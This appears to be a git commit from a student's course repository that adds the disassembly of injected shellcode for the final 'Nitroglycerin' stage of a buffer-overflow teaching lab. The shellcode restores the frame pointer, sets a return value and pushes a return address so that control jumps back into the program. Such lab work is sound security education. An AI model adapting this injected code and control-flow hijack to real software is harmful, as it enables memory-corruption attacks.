a6e07d384f049e455facc9bd78b74e649ef3c983
Zhenye Na <zna2@illinois.edu>
2018-07-09 00:02:35 -0500

    Add disassemble codes

---
+++ labs/Lab4-Buffer Lab/buflab-handout/Nitroglycerin.d
@@ -0,0 +1,11 @@
+
+Nitroglycerin.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	8d 6c 24 28          	lea    0x28(%esp),%ebp
+   4:	b8 ec 76 1b 76       	mov    $0x761b76ec,%eax
+   9:	68 3a 8e 04 08       	push   $0x8048e3a
+   e:	c3                   	ret    
